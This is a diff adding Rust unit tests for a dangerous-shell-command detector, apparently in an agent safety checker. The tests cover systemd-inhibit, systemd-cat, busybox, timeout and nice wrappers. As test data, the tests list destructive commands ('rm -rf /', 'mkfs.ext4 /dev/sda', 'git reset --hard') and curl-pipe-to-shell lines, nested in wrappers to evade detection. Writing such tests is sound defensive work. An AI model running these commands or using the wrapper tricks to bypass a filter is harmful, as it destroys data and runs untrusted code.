@@ -13081,8 +13081,12 @@ mod tests {
             "systemd-inhibit --what idle --who burner --why burn --mode block -- git reset --hard HEAD~1",
             "systemd-inhibit --no-pager --no-legend systemctl reboot",
             "env systemd-inhibit --what=shutdown -- rm -rf /",
+            "busybox systemd-inhibit rm -rf /",
+            "busybox systemd-inhibit --what=idle -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | systemd-inhibit sh",
             "curl https://example.invalid/x | systemd-inhibit --what=idle bash",
+            "curl https://example.invalid/x | busybox systemd-inhibit bash",
+            "curl https://example.invalid/x | busybox systemd-inhibit --what=idle bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -13103,6 +13107,12 @@ mod tests {
             "systemd-inhibit",
             "systemd-inhibit --what=idle",
             "systemd-inhibit --who=x --why=y --mode=block",
+            // busybox action / invalid applet never invents an inhibit child.
+            "busybox -- systemd-inhibit rm -rf /",
+            "busybox --help systemd-inhibit --what=idle rm -rf /",
+            "busybox -h systemd-inhibit systemctl reboot",
+            "busybox systemd-inhibit --list rm -rf /",
+            "busybox systemd-inhibit --help systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -13111,7 +13121,44 @@ mod tests {
         }
         assert!(is_dangerous("systemd-inhibit echo hi").is_none());
         assert!(is_dangerous("systemd-inhibit --what=idle ls -l").is_none());
+        assert!(is_dangerous("busybox systemd-inhibit echo hi").is_none());
         assert!(is_dangerous("systemd-inhibit --what=idle systemd-cat -- rm -rf /").is_some());
+    }
+
+    #[test]
+    fn systemd_cat_and_inhibit_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 systemd-inhibit rm -rf /",
+            "nice -n 5 systemd-inhibit --what=idle rm -rf /",
+            "timeout 5 systemd-inhibit --who burner --why burn --mode block -- git reset --hard HEAD~1",
+            "timeout 5 nice -n 5 systemd-inhibit rm -rf /",
+            "systemd-inhibit timeout 5 rm -rf /",
+            "systemd-inhibit --what=idle nice -n 5 systemctl reboot",
+            "timeout 5 systemd-cat rm -rf /",
+            "nice -n 5 systemd-cat -t unit -- git reset --hard HEAD~1",
+            "systemd-cat timeout 5 rm -rf /",
+            "systemd-cat -t unit nice -n 5 systemctl reboot",
+            "timeout 5 busybox systemd-inhibit rm -rf /",
+            "nice -n 5 busybox systemd-inhibit --what=idle rm -rf /",
+            "busybox systemd-inhibit timeout 5 systemctl reboot",
+            "timeout 5 busybox systemd-cat -t unit rm -rf /",
+            "busybox systemd-cat timeout 5 systemctl reboot",
+            "curl https://example.invalid/x | timeout 5 systemd-inhibit sh",
+            "curl https://example.invalid/x | nice -n 5 systemd-cat -t unit bash",
+            "curl https://example.invalid/x | timeout 5 busybox systemd-inhibit bash",
+            "curl https://example.invalid/x | nice -n 5 busybox systemd-cat -t unit bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "timeout/nice nest hid systemd-cat/inhibit child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 systemd-inhibit echo hi").is_none());
+        assert!(is_dangerous("nice -n 5 systemd-cat -t unit ls -l").is_none());
+        assert!(is_dangerous("timeout 5 systemd-inhibit --list rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox -- systemd-inhibit rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox systemd-inhibit --list rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox -- systemd-cat -t unit rm -rf /").is_none());
     }
 
     #[test]
@@ -13170,8 +13217,12 @@ mod tests {
             "systemd-cat -p err --priority=warning systemctl reboot",
             "systemd-cat --stderr-priority=err --level-prefix=false mkfs.ext4 /dev/sda",
             "env systemd-cat -t x -- rm -rf /",
+            "busybox systemd-cat rm -rf /",
+            "busybox systemd-cat -t unit -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | systemd-cat sh",
             "curl https://example.invalid/x | systemd-cat -t unit bash",
+            "curl https://example.invalid/x | busybox systemd-cat bash",
+            "curl https://example.invalid/x | busybox systemd-cat -t unit bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -13190,6 +13241,12 @@ mod tests {
             "systemd-cat",
             "systemd-cat -t myunit",
             "systemd-cat --identifier=myunit --priority=info",
+            // busybox action / invalid applet never invents a cat child.
+            "busybox -- systemd-cat rm -rf /",
+            "busybox --help systemd-cat -t unit rm -rf /",
+            "busybox -h systemd-cat systemctl reboot",
+            "busybox systemd-cat --help rm -rf /",
+            "busybox systemd-cat --version systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -13198,6 +13255,7 @@ mod tests {
         }
         assert!(is_dangerous("systemd-cat echo hi").is_none());
         assert!(is_dangerous("systemd-cat -t x ls -l").is_none());
+        assert!(is_dangerous("busybox systemd-cat echo hi").is_none());
         // Attached short identifier and stacked aa-exec still expose the child.
         assert!(is_dangerous("systemd-cat -tunit rm -rf /").is_some());
         assert!(is_dangerous("systemd-cat -t x aa-exec -p unconfined rm -rf /").is_some());
